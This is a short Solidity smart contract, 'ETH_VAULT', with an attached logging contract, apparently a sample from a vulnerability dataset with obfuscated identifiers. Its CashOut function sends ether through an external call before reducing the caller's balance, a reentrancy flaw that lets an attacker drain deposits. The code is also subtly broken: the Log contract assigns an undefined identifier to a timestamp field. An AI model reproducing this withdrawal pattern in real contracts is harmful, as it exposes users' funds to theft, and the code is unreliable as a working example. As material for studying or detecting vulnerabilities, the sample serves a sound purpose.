pragma solidity ^0.4.19;

contract ETH_VAULT
{
    mapping (address => uint) public _0xbb6648;

    uint public MinDeposit = 1 ether;

    Log TransferLog;

    function ETH_VAULT(address _0x418ae7)
    public
    {
        TransferLog = Log(_0x418ae7);
    }

    function Deposit()
    public
    payable
    {
        if(msg.value > MinDeposit)
        {
            _0xbb6648[msg.sender]+=msg.value;
            TransferLog.AddMessage(msg.sender,msg.value,"Deposit");
        }
    }

    function CashOut(uint _0xaf22d2)
    public
    payable
    {
        if(_0xaf22d2<=_0xbb6648[msg.sender])
        {
            if(msg.sender.call.value(_0xaf22d2)())
            {
                _0xbb6648[msg.sender]-=_0xaf22d2;
                TransferLog.AddMessage(msg.sender,_0xaf22d2,"CashOut");
            }
        }
    }

    function() public payable{}

}

contract Log
{

    struct Message
    {
        address Sender;
        string  Data;
        uint Val;
        uint  Time;
    }

    Message[] public History;

    Message LastMsg;

    function AddMessage(address _0x2a435d,uint _0x919d18,string _0xbbb075)
    public
    {
        LastMsg.Sender = _0x2a435d;
        LastMsg.Time = _0x5f87c8;
        LastMsg.Val = _0x919d18;
        LastMsg.Data = _0xbbb075;
        History.push(LastMsg);
    }
}